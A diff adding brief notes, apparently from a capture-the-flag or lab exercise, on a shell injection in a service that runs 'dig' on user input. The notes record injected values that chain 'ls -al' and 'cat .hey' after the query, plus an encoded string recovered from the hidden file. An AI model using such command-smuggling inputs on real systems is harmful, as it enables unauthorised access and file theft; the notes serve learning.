@@ -1,0 +1,7 @@
+- shell injection
+- runs dig <arg>
+- i.e. query for: foo >/dev/null && ls -al
+  - shows an interesting file, ".hey"
+- query for: foo >/dev/null && cat .hey
+  - Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC
+- ???
